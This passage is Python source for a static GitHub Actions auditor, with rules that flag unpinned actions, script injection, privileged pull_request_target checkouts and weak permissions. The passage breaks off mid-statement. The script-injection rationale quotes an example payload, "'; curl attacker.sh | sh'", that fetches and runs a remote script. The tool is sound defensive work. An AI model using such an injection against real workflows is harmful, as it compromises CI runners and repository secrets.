"""Rule engine for actions-audit: a static GitHub Actions workflow auditor.

The module is deliberately dependency-free apart from :mod:`actions_audit.miniyaml`,
which uses PyYAML when it happens to be importable and otherwise falls back to a
native reader for the YAML subset workflows use.

Every rule is a plain function ``(WorkflowContext) -> List[Finding]`` registered in
:data:`RULES`.  Rules are pure: they read the parsed document and the action's
source text, and never execute anything from the repository under audit.
"""

from __future__ import annotations

import json
import os
import re
from dataclasses import dataclass, field
from typing import Any, Dict, Iterable, List, Optional, Sequence, Tuple

from . import miniyaml
from .miniyaml import YamlError

__all__ = [
    "Finding",
    "Rule",
    "RuleError",
    "RULES",
    "SEVERITIES",
    "SEVERITY_RANK",
    "audit_paths",
    "audit_source",
    "expand_paths",
    "render_human",
    "render_json",
    "rule_catalogue",
]

SEVERITIES = ("high", "medium", "low")
SEVERITY_RANK = {"high": 3, "medium": 2, "low": 1}


class RuleError(Exception):
    """Unrecoverable input problem (usage error, unreadable or bad YAML)."""


# --------------------------------------------------------------------------
# Data model
# --------------------------------------------------------------------------


@dataclass(frozen=True)
class Finding:
    rule_id: str
    severity: str
    path: str
    line: int
    message: str
    fix: str
    evidence: str = ""

    def as_dict(self) -> Dict[str, Any]:
        return {
            "rule": self.rule_id,
            "severity": self.severity,
            "path": self.path,
            "line": self.line,
            "message": self.message,
            "fix": self.fix,
            "evidence": self.evidence,
        }


@dataclass
class Rule:
    id: str
    title: str
    severity: str
    rationale: str
    fix: str
    tags: Tuple[str, ...] = ()
    check: Any = None

    def as_dict(self) -> Dict[str, Any]:
        return {
            "id": self.id,
            "title": self.title,
            "severity": self.severity,
            "rationale": self.rationale,
            "fix": self.fix,
            "tags": list(self.tags),
        }


# --------------------------------------------------------------------------
# Small helpers
# --------------------------------------------------------------------------

_SHA_RE = re.compile(r"^[0-9a-fA-F]{40}$")
_USES_REF_RE = re.compile(r"^(?P<repo>[^@\s]+)@(?P<ref>[^@\s]+)$")
_EXPR_RE = re.compile(r"\$\{\{(?P<body>.*?)\}\}", re.DOTALL)
_SHELL_ASSIGN_RE = re.compile(
    r"(?:^|[;|&\s])(?:export\s+)?[A-Za-z_][A-Za-z0-9_]*\s*=\s*"
    r"[\"']?\$\{\{(?P<body>.*?)\}\}", re.DOTALL
)

# Contexts whose value is influenced by whoever can open an issue/PR/comment.
UNTRUSTED_PREFIXES = (
    "github.event.",
    "github.head_ref",
    "github.base_ref",
    "github.ref_name",
    "github.actor",
    "github.triggering_actor",
    "github.inputs.",
    "inputs.",
    "env.",
    "steps.",
    "needs.",
)

# A few github.event sub-keys are safe; everything else under github.event is not.
TRUSTED_EVENT_SUBKEYS = (
    "github.event.repository.name",
    "github.event.repository.full_name",
    "github.event.repository.id",
    "github.event.repository.owner.",
    "github.event.number",
    "github.event.pull_request.number",
    "github.event.pull_request.base.sha",
    "github.event.pull_request.base.ref",
    "github.event.pull_request.head.sha",
    "github.event.workflow_run.id",
    "github.event.workflow_run.head_sha",
    "github.event.workflow_run.head_branch",
    "github.event.workflow_run.head_repository.",
)

LOCKFILE_RE = re.compile(
    r"(package-lock\.json|npm-shrinkwrap\.json|yarn\.lock|pnpm-lock\.yaml|"
    r"poetry\.lock|Pipfile\.lock|requirements\.txt|uv\.lock|go\.sum|"
    r"Cargo\.lock|Gemfile\.lock|composer\.lock|packages\.lock\.json|"
    r"gradle\.lockfile|mix\.lock)",
    re.IGNORECASE,
)

DEPLOY_KEYWORDS = (
    "deploy", "publish", "release", "prod", "production", "ship", "promote",
)
DEPLOY_ACTION_HINTS = (
    "github-pages", "deploy-pages", "codecov", "gh-pages", "npm-publish",
    "pypi-publish",
    "docker/build-push-action", "aws-actions/", "google-github-actions/deploy",
    "azure/webapps-deploy", "cloudflare/wrangler-action", "vercel/action",
    "netlify/actions", "heroku/", "firebase-tools",
)
DEPLOY_SCRIPT_RE = re.compile(
    r"(npm\s+publish|pnpm\s+publish|yarn\s+npm\s+publish|twine\s+upload|"
    r"docker\s+push|gh\s+release|kubectl\s+apply|helm\s+upgrade|"
    r"serverless\s+deploy|wrangler\s+publish|vercel\s+deploy|"
    r"aws\s+s3\s+sync|terraform\s+apply|eb\s+deploy|gcloud\s+(?:app\s+)?deploy)",
    re.IGNORECASE,
)
CACHE_ACTION_RE = re.compile(r"^actions/cache(?:/restore|/save)?@")
SETUP_CACHE_ACTIONS = {
    "actions/setup-node": "npm",
    "actions/setup-python": "pip",
    "actions/setup-go": "go",
    "actions/setup-java": "maven",
    "actions/setup-dotnet": "nuget",
}
UNTRUSTED_CHECKOUT_REFS = ("head.sha", "head_ref", "workflow_run.head_sha",
                           "workflow_run.head_branch")


def _snippet(text: str, limit: int = 160) -> str:
    flat = " ".join(str(text).split())
    if len(flat) > limit:
        return flat[: limit - 3] + "..."
    return flat


def _is_sha(ref: Any) -> bool:
    return isinstance(ref, str) and bool(_SHA_RE.match(ref.strip()))


def _as_list(value: Any) -> List[Any]:
    if value is None:
        return []
    if isinstance(value, list):
        return value
    return [value]


def _redact(expression: str) -> str:
    """Render an expression for reporting without echoing secret values.

    ``secrets.FOO`` never carries a literal value in a workflow file, but the
    redaction keeps the tool safe to paste into issues: any assignment-looking
    right-hand side is masked.
    """
    return _snippet(expression, 120)


# --------------------------------------------------------------------------
# Parsed-document access helpers
# --------------------------------------------------------------------------


def trigger_map(data: Dict[str, Any]) -> Dict[str, Any]:
    """Normalised mapping of event name -> configuration.

    Handles the YAML 1.1 trap where an unquoted ``on:`` key is parsed as the
    boolean ``True`` rather than the string ``"on"``.
    """
    value = miniyaml.get_workflow_triggers(data)
    if value is None:
        return {}
    if isinstance(value, str):
        return {value: None}
    if isinstance(value, list):
        out: Dict[str, Any] = {}
        for item in value:
            if isinstance(item, str):
                out[item] = None
            elif isinstance(item, dict):
                for key in item:
                    out[str(key)] = item[key]
        return out
    if isinstance(value, dict):
        return {str(key): val for key, val in value.items()}
    return {}


def has_trigger(triggers: Dict[str, Any], *names: str) -> bool:
    return any(name in triggers for name in names)


def iterate_steps(job: Any) -> Iterable[Tuple[int, Dict[str, Any]]]:
    """Yield ``(index, step)`` for the mapping steps of a job."""
    if not isinstance(job, dict):
        return
    steps = job.get("steps")
    if not isinstance(steps, list):
        return
    for index, step in enumerate(steps):
        if isinstance(step, dict):
            yield index, step


def job_has_secrets(job: Any) -> Optional[str]:
    """Return a short description of the first secrets usage, else ``None``."""
    text = json.dumps(job, default=str)
    for expr in _EXPR_RE.finditer(text):
        body = expr.group("body")
        if "secrets." in body:
            match = re.search(r"secrets\.[A-Za-z0-9_\[\]\.\-]*", body)
            if match:
                return _redact(match.group(0))
    return None


def job_is_deploy(job_id: str, job: Dict[str, Any]) -> bool:
    haystack = " ".join([
        job_id,
        str(job.get("name") or ""),
        str(job.get("environment") or ""),
    ]).lower()
    if any(word in haystack for word in DEPLOY_KEYWORDS):
        return True
    return False


def step_looks_like_deploy(step: Dict[str, Any]) -> bool:
    uses = str(step.get("uses") or "")
    # Compare against the repo part so a SHA-pinned 'owner/repo@<sha>' still
    # matches a hint such as 'deploy-pages'.
    uses_lower = uses.split("@", 1)[0].lower()
    name = str(step.get("name") or "").lower()
    run = str(step.get("run") or "")
    if any(hint in uses_lower for hint in DEPLOY_ACTION_HINTS):
        return True
    if any(word in name for word in DEPLOY_KEYWORDS):
        return True
    if DEPLOY_SCRIPT_RE.search(run):
        return True
    return False


# --------------------------------------------------------------------------
# Workflow context
# --------------------------------------------------------------------------


@dataclass
class WorkflowContext:
    path: str
    display_path: str
    source: str
    data: Any
    lines: Dict[str, int]
    backend: str
    on_key: Optional[str]
    source_lines: List[str] = field(default_factory=list)

    @property
    def jobs(self) -> Dict[str, Any]:
        jobs = self.data.get("jobs") if isinstance(self.data, dict) else None
        if not isinstance(jobs, dict):
            return {}
        return {str(k): v for k, v in jobs.items() if isinstance(v, dict)}

    @property
    def triggers(self) -> Dict[str, Any]:
        if not isinstance(self.data, dict):
            return {}
        return trigger_map(self.data)

    def line_of(self, path: str) -> int:
        """Best-effort 1-based line for a dotted/indexed path.

        Both YAML backends record a line for a node's canonical path.  When a
        rule asks for a slightly different path (for example a sibling step
        rather than the whole step list), fall back to the nearest recorded
        ancestor and, failing that, to a text search over the source.
        """
        if path in self.lines:
            return self.lines[path]

        # 1. Nearest recorded ancestor. Both backends store a container's own
        #    line as its first child's line, so the ancestor entry alone is the
        #    right answer -- no sibling/index probing, which would overshoot.
        current = path
        while True:
            head, sep, _ = current.rpartition(".")
            if not sep or not head:
                break
            current = head
            if current in self.lines:
                return self.lines[current]
            bracket = re.match(r"^(.*)\[\d+\]$", current)
            if bracket:
                current = bracket.group(1)
                if current in self.lines:
                    return self.lines[current]

        # 2. Text search for the last path segment as a key.
        return self._search_line(path)

    def find_line(self, pattern: str, start: int, end: int,
                  literal: bool = False) -> Optional[int]:
        """Line in ``[start, end]`` matching ``pattern`` (or ``literal`` text)."""
        start = max(1, start)
        end = min(len(self.source_lines), max(start, end))
        if literal:
            for number in range(start, end + 1):
                if pattern in self.source_lines[number - 1]:
                    return number
            return None
        compiled = re.compile(pattern)
        for number in range(start, end + 1):
            if compiled.search(self.source_lines[number - 1]):
                return number
        return None

    def job_span(self, job_id: str) -> Tuple[int, int]:
        """Line range a job's definition occupies (1-based, inclusive)."""
        start = self.line_of("jobs.%s" % job_id)
        end = len(self.source_lines)
        for other in self.jobs:
            if other == job_id:
                continue
            other_start = self.line_of("jobs.%s" % other)
            if start < other_start < end:
                end = other_start
        return start, end

    def step_path(self, job_id: str, index: int) -> str:
        return "jobs.%s.steps[%d]" % (job_id, index)

    def step_span(self, job_id: str, index: int, step_count: int) -> Tuple[int, int]:
        """Line range one step occupies within its job."""
        start = self.line_of(self.step_path(job_id, index))
        _, job_end = self.job_span(job_id)
        end = job_end - 1 if job_end > start else job_end
        if index + 1 < step_count:
            following = self.line_of(self.step_path(job_id, index + 1))
            if start < following <= job_end:
                end = following - 1
        return start, max(start, end)

    def _search_line(self, path: str) -> int:
        keys = [seg for seg in re.split(r"[.\[\]]", path) if seg and not seg.isdigit()]
        if not keys:
            return 1
        key = keys[-1]
        pattern = re.compile(r"^\s*[\"']?" + re.escape(key) + r"[\"']?\s*:")
        wanted = 2 * max(0, len(keys) - 1)
        best_line = 1
        best_score = None
        for number, text in enumerate(self.source_lines, 1):
            if not pattern.match(text):
                continue
            indent = len(text) - len(text.lstrip(" "))
            score = (abs(indent - wanted), number)
            if best_score is None or score < best_score:
                best_score = score
                best_line = number
        return best_line

    def evidence(self, line: int) -> str:
        if 1 <= line <= len(self.source_lines):
            return _snippet(self.source_lines[line - 1].strip())
        return ""


# --------------------------------------------------------------------------
# Rules
# --------------------------------------------------------------------------

RULES: List[Rule] = []


def rule(rule_id: str, title: str, severity: str, rationale: str, fix: str,
         tags: Sequence[str] = ()):
    def decorate(func):
        RULES.append(Rule(id=rule_id, title=title, severity=severity,
                          rationale=rationale, fix=fix, tags=tuple(tags),
                          check=func))
        return func
    return decorate


def mutable_ref_suggestion(repo: str, ref: str) -> str:
    """Concrete pinned form for the offending ref, on one line.

    Kept short on purpose: one of these fires per unpinned action, so a
    multi-line fix would drown the report.
    """
    return ("Pin it: '%s@<40-char-commit-sha> # %s'. Resolve the tag with "
            "'git ls-remote https://github.com/%s refs/tags/%s' (or copy the "
            "commit SHA from the release page), then keep the version in the "
            "trailing comment." % (repo, ref, repo, ref))


@rule(
    "mutable-action-ref",
    "Action referenced by a mutable ref instead of a commit SHA",
    "high",
    "A branch or tag ref such as @v4 or @main can be moved by whoever controls "
    "the action repository, so the code executed by your workflow can change "
    "without any commit in your own repository. This is the core GitHub Actions "
    "supply-chain risk.",
    "Pin the action to a full 40-character commit SHA. Keep the human-readable "
    "version in a trailing comment so updates stay reviewable.",
    ("supply-chain",),
)
def check_mutable_action_ref(ctx: WorkflowContext) -> List[Finding]:
    findings: List[Finding] = []
    for job_id, job in ctx.jobs.items():
        for index, step in iterate_steps(job):
            uses = step.get("uses")
            if not isinstance(uses, str):
                continue
            value = uses.strip()
            if value.startswith("./") or value.startswith("docker://"):
                continue
            if "${{" in value:
                continue
            match = _USES_REF_RE.match(value)
            if not match:
                continue
            repo, ref = match.group("repo"), match.group("ref")
            if _is_sha(ref):
                continue
            line = ctx.line_of(ctx.step_path(job_id, index))
            findings.append(Finding(
                rule_id="mutable-action-ref",
                severity="high",
                path=ctx.display_path,
                line=line,
                message="%s is pinned to the mutable ref '@%s'." % (repo, ref),
                fix=mutable_ref_suggestion(repo, ref),
                evidence=_snippet(value, 100),
            ))
    return findings


@rule(
    "pull-request-target-code-execution",
    "pull_request_target combined with PR-controlled code",
    "high",
    "pull_request_target runs in the context of the base repository, so it gets "
    "a read/write GITHUB_TOKEN and repository secrets even for a fork pull "
    "request, while any code checked out from the pull request is still "
    "attacker-controlled. Executing that code hands the attacker the privileged "
    "context.",
    "Do not run or check out PR code in a pull_request_target workflow. Use the "
    "pull_request trigger for anything that builds or tests PR content, or "
    "restrict the job to reading PR metadata (labels, files) without checking "
    "out the PR head.",
    ("privilege-escalation",),
)
def check_pull_request_target(ctx: WorkflowContext) -> List[Finding]:
    triggers = ctx.triggers
    if "pull_request_target" not in triggers:
        return []
    findings: List[Finding] = []
    for job_id, job in ctx.jobs.items():
        for index, step in iterate_steps(job):
            uses = str(step.get("uses") or "")
            with_block = step.get("with") if isinstance(step.get("with"), dict) else {}
            step_line = ctx.line_of(ctx.step_path(job_id, index))
            if "actions/checkout" in uses:
                ref = str(with_block.get("ref") or "")
                if not any(marker in ref for marker in UNTRUSTED_CHECKOUT_REFS):
                    continue
                findings.append(Finding(
                    rule_id="pull-request-target-code-execution",
                    severity="high",
                    path=ctx.display_path,
                    line=step_line,
                    message=("pull_request_target job %r checks out the pull "
                             "request's own commit (ref: %s), then continues "
                             "with a privileged token." % (job_id, _snippet(ref, 60))),
                    fix=("Drop the PR-controlled ref and trigger on "
                         "pull_request instead, or keep pull_request_target but "
                         "never check out the PR head."),
                    evidence=ctx.evidence(step_line),
                ))
                continue
            run = step.get("run")
            if not isinstance(run, str):
                continue
            risky = _dangerous_expressions(run)
            if risky:
                detail = ", ".join(sorted(risky)[:3])
                findings.append(Finding(
                    rule_id="pull-request-target-code-execution",
                    severity="high",
                    path=ctx.display_path,
                    line=step_line,
                    message=("pull_request_target job %r runs a shell step that "
                             "interpolates untrusted data (%s) with a privileged "
                             "token." % (job_id, detail)),
                    fix=("Move the shell work to a pull_request workflow. In "
                         "pull_request_target, treat PR content as data only and "
                         "pass it to a script through env: instead of building a "
                         "command line from it."),
                    evidence=_snippet(run, 160),
                ))
    return findings


def _dangerous_expressions(text: str) -> List[str]:
    found: List[str] = []
    for match in _EXPR_RE.finditer(text):
        body = match.group("body").strip()
        if _is_untrusted(body):
            found.append("${{ %s }}" % _snippet(body, 60))
    return found


def _is_untrusted(expression: str) -> bool:
    expr = expression.strip()
    for trusted in TRUSTED_EVENT_SUBKEYS:
        if trusted in expr:
            return False
    return any(prefix in expr for prefix in UNTRUSTED_PREFIXES)


@rule(
    "permissions-missing",
    "No top-level permissions: block",
    "medium",
    "Without an explicit permissions: block, the workflow's GITHUB_TOKEN gets "
    "the repository's default permission set, which for older repositories is "
    "read/write on contents, packages and more. An action or script that is "
    "compromised then inherits write access it never needed.",
    "Add an explicit least-privilege block at workflow level, for example "
    "'permissions:\\n  contents: read', and grant extra scopes only on the "
    "individual job that needs them.",
    ("least-privilege",),
)
def check_permissions_missing(ctx: WorkflowContext) -> List[Finding]:
    if not isinstance(ctx.data, dict):
        return []
    if "permissions" in ctx.data:
        return []
    line = ctx.line_of("jobs")
    return [Finding(
        rule_id="permissions-missing",
        severity="medium",
        path=ctx.display_path,
        line=1,
        message="Workflow declares no top-level permissions:, so GITHUB_TOKEN "
                "inherits the repository default (historically read/write).",
        fix=("Add a workflow-level least-privilege block, e.g. "
             "'permissions:\\n  contents: read', and widen it per job only "
             "where required."),
        evidence=ctx.evidence(1),
    )]


@rule(
    "permissions-write-all",
    "permissions set to write-all",
    "high",
    "write-all grants every scope the GITHUB_TOKEN supports. Any step that runs "
    "untrusted or third-party code inherits full write access to the repository, "
    "packages, issues and more.",
    "Replace write-all with the smallest set of scopes that job needs, for "
    "example 'contents: read' plus 'id-token: write' only for the deploy job "
    "that federates to a cloud provider.",
    ("least-privilege",),
)
def check_permissions_write_all(ctx: WorkflowContext) -> List[Finding]:
    findings: List[Finding] = []
    if not isinstance(ctx.data, dict):
        return findings
    top = ctx.data.get("permissions")
    if isinstance(top, str) and top.strip().lower() == "write-all":
        line = ctx.line_of("permissions")
        findings.append(Finding(
            rule_id="permissions-write-all",
            severity="high",
            path=ctx.display_path,
            line=line,
            message="Workflow-level permissions: write-all grants every scope.",
            fix="Replace write-all with explicit per-scope read/write entries.",
            evidence=ctx.evidence(line),
        ))
    for job_id, job in ctx.jobs.items():
        perms = job.get("permissions")
        if isinstance(perms, str) and perms.strip().lower() == "write-all":
            line = ctx.line_of("jobs.%s.permissions" % job_id)
            findings.append(Finding(
                rule_id="permissions-write-all",
                severity="high",
                path=ctx.display_path,
                line=line,
                message="Job %r sets permissions: write-all." % job_id,
                fix="Grant only the scopes this job actually uses.",
                evidence=ctx.evidence(line),
            ))
    return findings


@rule(
    "script-injection",
    "Untrusted context interpolated directly into a run: block",
    "high",
    "GitHub substitutes ${{ ... }} into the script text before the shell ever "
    "sees it, so a value the attacker controls (a PR title, a branch name, a "
    "commit message) becomes shell syntax. A title such as "
    "'; curl attacker.sh | sh' is executed as a command. The same expression "
    "placed in env: is inert, because the shell only ever reads it as a "
    "variable value.",
    "Move the value into env: and reference it as a quoted shell variable. "
    "Write 'env:\\n  TITLE: ${{ github.event.pull_request.title }}' and then "
    "'printf \"%s\" \"$TITLE\"' -- never interpolate the expression into the "
    "command text.",
    ("injection",),
)
def check_script_injection(ctx: WorkflowContext) -> List[Finding]:
    findings: List[Finding] = []
    for job_id, job in ctx.jobs.items():
        for index, step in iterate_steps(job):
            run = step.get("run")
            if not isinstance(run, str):
                continue
            step_line = ctx.line_of(ctx.step_path(job_id, index))
            start, end = ctx.step_span(job_id, index, len(list(iterate_steps(job))))
            run_line = ctx.find_line(r"^\s*run\s*:", start, end) or step_line
            unsafe = _dangerous_expressions(run)
            for expr in unsafe[:5]:
                findings.append(Finding(
                    rule_id="script-injection",
                    severity="high",
                    path=ctx.display_path,
                    line=run_line,
                    message=("run: block in job %r interpolates %s directly into "
                             "shell text." % (job_id, expr)),
                    fix=("Pass the expression through env: and reference it as a "
                         "quoted variable ($VAR / \"${VAR}\"). Values reach the "
                         "shell as data, not as syntax."),
                    evidence=_snippet(run, 160),
                ))
            for match in _SHELL_ASSIGN_RE.finditer(run):
                body = match.group("body").strip()
                if not _is_untrusted(body):
                    continue
                if any(expr.endswith(_snippet(body, 60) + " }}") for expr in unsafe):
                    continue
                findings.append(Finding(
                    rule_id="script-injection",
                    severity="high",
                    path=ctx.display_path,
                    line=run_line,
                    message=("run: block in job %r assigns %s to a shell variable "
                             "on the command line, where the shell still parses "
                             "it." % (job_id, _snippet(body, 60))),
                    fix=("Declare the value under the step's env: mapping instead "
                         "of assigning ${{ ... }} inside the script."),
                    evidence=_snippet(run, 160),
                ))
    return findings


@rule(
    "fork-secret-unavailable",
    "Secret referenced in a fork-triggered pull_request workflow",
    "medium",
    "Secrets are not passed to workflows triggered by pull_request from a fork "
    "(except GITHUB_TOKEN, which is read-only in that context). A reference such "
    "as secrets.NPM_TOKEN therefore expands to an empty string and the step "
    "fails at an unpredictable point -- and naming the secret in a public "
    "workflow file documents which credential an attacker should target.",
    "Keep secret-consuming work out of fork-triggered workflows: gate it behind "
    "a workflow_run or workflow_dispatch job that runs in the base repository, "
    "or use OIDC federation with id-token: write for cloud credentials.",
    ("secrets",),
)
def check_fork_secrets(ctx: WorkflowContext) -> List[Finding]:
    triggers = ctx.triggers
    if "pull_request" not in triggers or "pull_request_target" in triggers:
        return []
    if "workflow_run" in triggers:
        # A workflow_run in the same file runs in the base repository, where
        # secrets are available; the "unavailable" claim would not hold.
        return []
    findings: List[Finding] = []
    for job_id, job in ctx.jobs.items():
        reference = job_has_secrets(job)
        if not reference:
            continue
        start, end = ctx.job_span(job_id)
        line = (ctx.find_line(r"secrets\.[A-Za-z0-9_\[\]\.\-]+", start, end)
                or start)
        findings.append(Finding(
            rule_id="fork-secret-unavailable",
            severity="medium",
            path=ctx.display_path,
            line=line,
            message=("Job %r references %s in a pull_request workflow. Fork "
                     "pull requests do not receive repository secrets, so the "
                     "reference resolves to an empty value." % (job_id, reference)),
            fix=("Move the secret-consuming step into a workflow that runs in "
                 "the base repository (workflow_run/workflow_dispatch), or "
                 "switch to OIDC federation so no long-lived secret is "
                 "needed."),
            evidence=ctx.evidence(line),
        ))
    return findings


@rule(
    "job-timeout-missing",
    "Job has no timeout-minutes",
    "medium",
    "GitHub's default job timeout is 360 minutes. A hung test, a stalled "
    "network fetch or a step waiting on input burns runner minutes (and, on "
    "private repositories, money) for up to six hours before the job is killed.",
    "Set timeout-minutes on every job -- a realistic value, for example 15 for "
    "tests and 30 for a container build -- so a hang fails fast.",
    ("reliability",),
)
def check_job_timeout(ctx: WorkflowContext) -> List[Finding]:
    findings: List[Finding] = []
    for job_id, job in ctx.jobs.items():
        if "timeout-minutes" in job:
            continue
        line = ctx.line_of("jobs.%s" % job_id)
        findings.append(Finding(
            rule_id="job-timeout-missing",
            severity="medium",
            path=ctx.display_path,
            line=line,
            message="Job %r sets no timeout-minutes (default is 360 minutes)."
                    % job_id,
            fix="Add 'timeout-minutes: 15' (or a value suited to the job) under "
                "the job.",
            evidence=ctx.evidence(line),
        ))
    return findings


@rule(
    "concurrency-missing-deploy",
    "Deploy or publish workflow has no concurrency group",
    "medium",
    "Two pushes in quick succession can start two deploys at once. The older run "
    "may finish last and overwrite the newer release, and a cancelled deploy can "
    "leave the target half-updated.",
    "Add a workflow-level concurrency group with cancel-in-progress: false for "
    "deploys, so a queued deploy waits rather than racing: "
    "'concurrency:\\n  group: deploy-${{ github.ref }}\\n  cancel-in-progress: false'.",
    ("reliability",),
)
def check_concurrency(ctx: WorkflowContext) -> List[Finding]:
    if not isinstance(ctx.data, dict):
        return []
    if "concurrency" in ctx.data:
        return []
    deploy_jobs = [jid for jid, job in ctx.jobs.items() if job_is_deploy(jid, job)]
    if not deploy_jobs:
        return []
    return [Finding(
        rule_id="concurrency-missing-deploy",
        severity="medium",
        path=ctx.display_path,
        line=ctx.line_of("jobs.%s" % deploy_jobs[0]),
        message=("Workflow contains deploy/publish job(s) %s but declares no "
                 "concurrency group, so overlapping runs can race."
                 % ", ".join(sorted(deploy_jobs))),
        fix=("Add a workflow-level concurrency group keyed on the ref or "
             "environment, with cancel-in-progress: false for deploys."),
        evidence=ctx.evidence(ctx.line_of("jobs.%s" % deploy_jobs[0])),
    )]


@rule(
    "checkout-persist-credentials",
    "actions/checkout keeps the token on disk while later steps run untrusted code",
    "medium",
    "actions/checkout stores the GITHUB_TOKEN in the local git config by default "
    "(persist-credentials defaults to true). Any later step that executes code "
    "from the pull request -- a build script, a test runner, a make target -- can "
    "read that token and push to the repository with it.",
    "Set 'with:\\n  persist-credentials: false' on the checkout step whenever a "
    "later step runs code you do not control, and pass the token explicitly to "
    "only the steps that need it.",
    ("least-privilege",),
)
def check_persist_credentials(ctx: WorkflowContext) -> List[Finding]:
    findings: List[Finding] = []
    untrusted_events = has_trigger(ctx.triggers, "pull_request",
                                   "pull_request_target", "workflow_run")
    for job_id, job in ctx.jobs.items():
        steps = list(iterate_steps(job))
        checkout_index = None
        checkout_step: Dict[str, Any] = {}
        for index, step in steps:
            if "actions/checkout" in str(step.get("uses") or ""):
                checkout_index = index
                checkout_step = step
                break
        if checkout_index is None:
            continue
        with_block = checkout_step.get("with")
        with_block = with_block if isinstance(with_block, dict) else {}
        persist = with_block.get("persist-credentials")
        if persist is False or str(persist).lower() == "false":
            continue
        if "token" in with_block:
            continue
        later = [step for index, step in steps if index > checkout_index]
        runs_untrusted = any(
            isinstance(step.get("run"), str)
            or any(hint in str(step.get("uses") or "") for hint in
                   ("docker/build-push-action", "npm", "make", "gradle"))
            for step in later
        )
        if not runs_untrusted and not untrusted_events:
            continue
        line = ctx.line_of(ctx.step_path(job_id, checkout_index))
        findings.append(Finding(
            rule_id="checkout-persist-credentials",
            severity="medium",
            path=ctx.display_path,
            line=line,
            message=("Job %r runs actions/checkout without "
                     "persist-credentials: false, then runs further commands%s."
                     % (job_id, " in an untrusted-trigger workflow"
                        if untrusted_events else "")),
            fix=("Add 'persist-credentials: false' to the checkout step's with: "
                 "block, and pass GITHUB_TOKEN explicitly to the few steps that "
                 "need it."),
            evidence=ctx.evidence(line),
        ))
    return findings


@rule(
    "continue-on-error-deploy",
    "continue-on-error on a job or step that gates a deploy",
    "high",
    "continue-on-error: true turns a failed deploy into a green run. The deploy "
    "step can fail while the workflow reports success, so nothing alerts and the "
    "next stage proceeds against a target that was never updated.",
    "Remove continue-on-error from anything that ships code. If the step is only "
    "a best-effort notification, move it to its own job that does not gate the "
    "deploy, and keep the deploy job's result meaningful.",
    ("reliability",),
)
def check_continue_on_error_deploy(ctx: WorkflowContext) -> List[Finding]:
    findings: List[Finding] = []
    deploy_jobs = {jid for jid, job in ctx.jobs.items() if job_is_deploy(jid, job)}
    for job_id, job in ctx.jobs.items():
        job_level = job.get("continue-on-error")
        if job_level is True or str(job_level).lower() == "true":
            if job_id in deploy_jobs:
                start, end = ctx.job_span(job_id)
                line = (ctx.find_line(r"^\s*continue-on-error\s*:\s*true", start, end)
                        or start)
                findings.append(Finding(
                    rule_id="continue-on-error-deploy",
                    severity="high",
                    path=ctx.display_path,
                    line=line,
                    message=("Deploy job %r sets continue-on-error: true, so a "
                             "failed deploy still reports success." % job_id),
                    fix=("Delete continue-on-error from the deploy job. Keep the "
                         "job red on failure so the pipeline stops and alerts."),
                    evidence=ctx.evidence(line),
                ))
        step_list = list(iterate_steps(job))
        for index, step in step_list:
            value = step.get("continue-on-error")
            if not (value is True or str(value).lower() == "true"):
                continue
            if not step_looks_like_deploy(step):
                continue
            start, end = ctx.step_span(job_id, index, len(step_list))
            line = (ctx.find_line(r"^\s*continue-on-error\s*:\s*true", start, end)
                    or ctx.line_of(ctx.step_path(job_id, index)))
            findings.append(Finding(
                rule_id="continue-on-error-deploy",
                severity="high",
                path=ctx.display_path,
                line=line,
                message=("Publish/deploy step %r in job %r sets "
                         "continue-on-error: true." % (step.get("name") or step.get("uses"), job_id)),
                fix=("Remove continue-on-error from the publish/deploy step, or "
                     "move the step to a non-gating job."),
                evidence=ctx.evidence(line),
            ))
    return findings


@rule(
    "self-hosted-runner",
    "Self-hosted runner used",
    "medium",
    "A self-hosted runner executes workflow code on a machine you own, and on a "
    "public repository it can be reached by fork pull requests. GitHub does not "
    "run workflows from first-time contributors without approval and documents "
    "self-hosted runners as unsuitable for public repositories, but the danger is "
    "the same for any fork a maintainer approves: the runner's credentials, "
    "network position and local files are exposed.",
    "Use GitHub-hosted runners for any workflow reachable from a fork. If a "
    "self-hosted runner is unavoidable, make it ephemeral, give it no persistent "
    "secrets, and restrict the workflow to trusted triggers (workflow_dispatch, "
    "push on protected branches). (Whether this repository is public cannot be "
    "determined from a workflow file alone -- verify it before acting.)",
    ("runners",),
)
def check_self_hosted(ctx: WorkflowContext) -> List[Finding]:
    findings: List[Finding] = []
    for job_id, job in ctx.jobs.items():
        runs_on = job.get("runs-on")
        labels: List[str] = []
        if isinstance(runs_on, str):
            labels = [runs_on]
        elif isinstance(runs_on, list):
            labels = [str(item) for item in runs_on]
        elif isinstance(runs_on, dict):
            labels = [str(value) for value in runs_on.values()]
        if not any("self-hosted" in label.lower() for label in labels):
            continue
        line = ctx.line_of("jobs.%s.runs-on" % job_id)
        findings.append(Finding(
            rule_id="self-hosted-runner",
            severity="medium",
            path=ctx.display_path,
            line=line,
            message=("Job %r requests a self-hosted runner (%s)."
                     % (job_id, ", ".join(labels))),
            fix=("Use a GitHub-hosted runner for fork-reachable workflows, or "
                 "make the self-hosted runner ephemeral and free of persistent "
                 "secrets. Confirm the repository's visibility first."),
            evidence=ctx.evidence(line),
        ))
    return findings


@rule(
    "workflow-run-checkout",
    "workflow_run job checks out the triggering run's code",
    "high",
    "A workflow_run workflow runs in the base repository with a write token and "
    "access to secrets, but it is triggered by another run whose code (an "
    "artifact, a branch, a commit) may come from an untrusted fork pull request. "
    "Checking out that revision and then building, testing or executing it hands "
    "an attacker the privileged context.",
    "Check out an explicit, trusted revision: pin 'ref:' to a commit SHA, or "
    "download artifacts by name and validate them, and never use the triggering "
    "run's head SHA or head branch as the code you execute.",
    ("privilege-escalation",),
)
def check_workflow_run_checkout(ctx: WorkflowContext) -> List[Finding]:
    if not has_trigger(ctx.triggers, "workflow_run"):
        return []
    findings: List[Finding] = []
    for job_id, job in ctx.jobs.items():
        for index, step in iterate_steps(job):
            uses = str(step.get("uses") or "")
            if "actions/checkout" not in uses:
                continue
            with_block = step.get("with")
            with_block = with_block if isinstance(with_block, dict) else {}
            ref = str(with_block.get("ref") or "")
            step_line = ctx.line_of(ctx.step_path(job_id, index))
            # Only the triggering run's revision is workflow_run-specific: the
            # default checkout would be the base repository's default branch,
            # and any ref that names workflow_run context is the untrusted one.
            if not any(marker in ref for marker in UNTRUSTED_CHECKOUT_REFS
                       if marker.startswith("workflow_run")):
                continue
            start, end = ctx.step_span(job_id, index, len(list(iterate_steps(job))))
            line = (ctx.find_line(r"^\s*ref\s*:", start, end) or step_line)
            findings.append(Finding(
                rule_id="workflow-run-checkout",
                severity="high",
                path=ctx.display_path,
                line=line,
                message=("workflow_run job %r checks out ref '%s', which is code "
                         "from the triggering run rather than a trusted revision."
